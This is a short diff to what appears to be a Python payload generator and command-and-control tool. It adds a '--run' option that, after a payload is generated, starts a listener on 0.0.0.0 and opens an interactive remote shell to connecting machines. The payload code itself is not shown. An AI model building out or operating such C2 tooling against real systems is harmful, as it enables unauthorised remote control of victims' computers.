@@ -76,6 +76,22 @@ def cmd_generate(args):
     print(f" {c('[+]', G)} Key:     {c(key_str, Y)}")
     print()
 
+    if args.run:
+        key_bytes = key_str.encode()
+        print(f" {c('[*]', B)} Auto-starting handler on {c(f'0.0.0.0:{args.port}', C)}...\n")
+        handler = Handler("0.0.0.0", args.port, key_bytes)
+        try:
+            handler.start()
+            handler.shell()
+        except OSError as e:
+            print(f"\n {c('[!]', R)} {e}")
+            sys.exit(1)
+        except KeyboardInterrupt:
+            pass
+        finally:
+            handler.stop()
+            print(f"\n {c('[*]', B)} Handler stopped.")
+
 
 def cmd_handler(args):
     print_banner()
@@ -134,6 +150,7 @@ def main():
     gen.add_argument("--key", help="Encryption key (auto-generated if omitted)")
     gen.add_argument("--output", default="payloads", help="Output directory (default: payloads)")
     gen.add_argument("--name", help="Output filename (auto-generated if omitted)")
+    gen.add_argument("--run", action="store_true", help="Auto-start handler after generation")
 
     # --- handler ---
     hdl = sub.add_parser("handler", help="Start C2 handler")
